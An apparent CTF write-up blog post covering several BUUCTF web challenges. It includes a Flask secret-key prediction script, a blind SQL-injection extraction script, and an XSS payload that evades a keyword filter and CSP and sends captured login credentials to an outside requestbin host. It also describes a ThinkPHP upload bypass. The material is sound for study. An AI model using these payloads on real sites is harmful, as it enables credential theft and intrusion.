---
title: "BUUCTF Web Writeup 9"
date: 2022-11-25T18:35:12+08:00
lastmod: 2022-11-25T18:35:12+08:00
draft: true
author: "X1r0z"

tags: []
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录…

<!--more-->

## [CISCN2019 华东南赛区]Web4

任意文件读取

```
http://b49584d3-3080-416f-9e7e-f1390082ab6a.node4.buuoj.cn:81/read?url=/proc/self/cmdline
```

读取 cmdline 之后发现源文件在 /app/app.py 下, 然后读取 /usr/local/bin/python 发现环境是 2.7

```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

一开始往 flask pin 方向想了, 看到 `uuid.getnode()` 才想起来读取的是 mac 地址, 那么就存在伪随机数的问题

```python
import random
import uuid

mac = '1a:fe:f0:5d:cc:05'
n = int(mac.replace(':', ''), 16)
random.seed(n)
print str(random.random() * 233)
```

首先必须得用 python 2.7 来跑, 然后坑点是 str 会对小数点后面几位四舍五入一下, 所以最终的 secret\_key 是 `145.348233579` 而不是 `145.34823357875226`

flask-session-cookie-manager 伪造 cookie 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211251840944.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211251840586.png)

看 wp 学到一个知识点, flask 环境下可以用 `local_file://` 代替 `file://`

## [Black Watch 入群题]Web

前端 webpack 打包, 开发者工具可以看到 vue 源码

简单异或 sql 注入

```python
import requests
import time

flag = ''

i = 1

while True:

    min = 32
    max = 127

    while min < max:
        time.sleep(0.08)
        mid = (min + max) // 2
        print(chr(mid))

        payload = 'if(ascii(substr((select(group_concat(username,\'_\',password))from(admin)),{},1))>{},1,0)'.format(i, mid)
        url = 'http://8f46cc43-6237-42d6-ae95-bee39e010ed1.node4.buuoj.cn:81/backend/content_detail.php?id=1^({})^1'.format(payload)
        res = requests.get(url)
        if 'content' in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1

    print('found', flag)
```

用跑出来的第二个用户登录即可得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211252017842.png)

## [GWCTF 2019]mypassword

随便注册一个用户登录, 然后看到 Feedback, 右键注释如下

```php
if(is_array($feedback)){
    echo "<script>alert('反馈不合法');</script>";
    return false;
}
$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
foreach ($blacklist as $val) {
    while(true){
        if(stripos($feedback,$val) !== false){
            $feedback = str_ireplace($val,"",$feedback);
        }else{
            break;
        }
    }
}
```

随便写一点内容, 提交后去 List 查看, 发现 response header

```
Content-Security-Policy: default-src 'self';script-src 'unsafe-inline' 'self'
```

猜测是 xss bypass CSP

上面的黑名单绕过逻辑有点问题, 这里可以通过添加某个关键词来绕过该关键词前面的内容

即往 input script src 这些单词里面插入 cookie 可以绕过, 但是 cookie 关键词本身绕不过去, 无法获取 `document. cookie` 的内容

之后发现登录界面引用了一个 js 文件

```javascript
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```

到这里思路就很清晰了, 我们可以间接获取 cookie 的内容, 即先插入两个 input 表单并引用此 js 文件, 然后通过 dom 获取 username password, 最后绕过 csp 外带数据

绕过 csp 的方法很多, 下面以 `document.location` 为例

```html
<incookieput type="text" name="username">
<incookieput type="password" name="password">

<scrcookieipt scookierc="/js/login.js"></sccookieript>
<scrcookieipt>
	var username = docucookiement.getEcookielementsByName("username")[0].value;
    var password = doccookieument.getEcookielementsByName("password")[0].value;
    var  data = username + ":" + password;
    docookiecument.locacookietion = "http://http.requestbin.buuoj.cn/xxxx?data=" + data;
</scrcookieipt>
```

最后在 buu requestbin 上查看 flag

![image-20221130154432464](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301544573.png)

## [RootersCTF2019]babyWeb

简单报错注入

![image-20221130155328561](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301553622.png)

## [RoarCTF 2019]Simple Upload

thinkphp 3.2.4

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

试了一圈后发现并没有限制上传白名单, 后来看了文档发现人家的参数是 exts, 所以根本就没有 allowExts 这个参数

[https://www.kancloud.cn/manual/thinkphp/1876](https://www.kancloud.cn/manual/thinkphp/1876)

继续看文档发现上传单文件是 uploadOne, 上传多文件是 upload, 那么这里就可以构造多个 file 表单上传, 只是返回不了文件地址 (代码中仅输出 `$info['file']['savepath']` 这一条路径)

思路就是同时上传 A B(PHP), 然后爆破得出 PHP 文件的路径, 或者是依次上传 A B(PHP) A 这种方式得到文件名的范围

thinkphp 3 默认用 uniqid 函数来生成文件名, 其实就是微秒级别的时间戳, 但是注意会出现 a b c d e f 这几个字母

最后按照上面的思路上传后爆破文件名得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301726338.png)

## [HFCTF2020]BabyUpload

